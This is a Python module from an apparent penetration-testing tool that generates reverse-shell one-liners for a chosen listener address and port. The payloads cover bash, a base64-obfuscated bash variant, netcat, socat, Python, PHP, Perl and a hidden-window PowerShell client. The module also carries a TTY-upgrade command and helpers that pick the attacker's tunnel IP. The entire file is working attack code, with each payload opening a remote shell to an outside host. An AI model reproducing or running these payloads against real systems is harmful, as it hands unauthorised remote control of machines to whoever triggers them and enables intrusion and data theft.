"""Reverse-shell payload generation and the TTY-upgrade primitive."""

from __future__ import annotations

import base64
import socket
import subprocess

# Sent to a connected dumb shell to turn it into a full PTY.
TTY_UPGRADE = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"


def pty_setup(rows: int, cols: int) -> str:
    """Run inside the freshly-spawned PTY: match the operator's terminal so line
    wrapping, clear and full-screen apps (vi, less) behave."""
    return f"export TERM=xterm-256color; stty rows {rows} cols {cols}"

# VPN / tunnel interface prefixes — on an engagement the LHOST you want is the
# tunnel IP, not the LAN/NAT address the default route would pick.
_TUNNELS = ("tun", "tap", "wg", "utun", "ppp")


def _tunnel_ip() -> str | None:
    """The IPv4 of a VPN/tunnel interface, if one is up (best-effort, via `ip`)."""
    try:
        out = subprocess.run(["ip", "-o", "-4", "addr", "show"],
                             capture_output=True, text=True, timeout=2).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[1].startswith(_TUNNELS) and parts[2] == "inet":
            return parts[3].split("/")[0]
    return None


def _route_ip() -> str:
    """The local IP used to reach the default route."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def guess_lhost() -> str:
    """Best-effort LHOST: a VPN/tunnel IP if one is up (the engagement address),
    else the default-route IP."""
    return _tunnel_ip() or _route_ip()


def generate(lhost: str, lport: int) -> dict[str, str]:
    """Return a map of {name: reverse-shell one-liner} for the given LHOST/LPORT."""
    bash = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64 = base64.b64encode(bash.encode()).decode()
    return {
        "bash": bash,
        # base64-wrapped bash — for contexts that choke on quotes or `/dev/tcp`.
        "bash-base64": f"echo {b64}|base64 -d|bash",
        "sh-fifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "nc-e": f"nc -e /bin/sh {lhost} {lport}",
        # socat: a clean interactive shell; socat-pty is fully interactive (job control).
        "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh",
        "socat-pty": f"socat TCP:{lhost}:{lport} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",
        "python3": (
            "python3 -c 'import socket,os,pty;s=socket.socket();"
            f's.connect(("{lhost}",{lport}));'
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        ),
        "php": f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ),
        "powershell": (
            "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('"
            f"{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName "
            "System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()}\""
        ),
    }
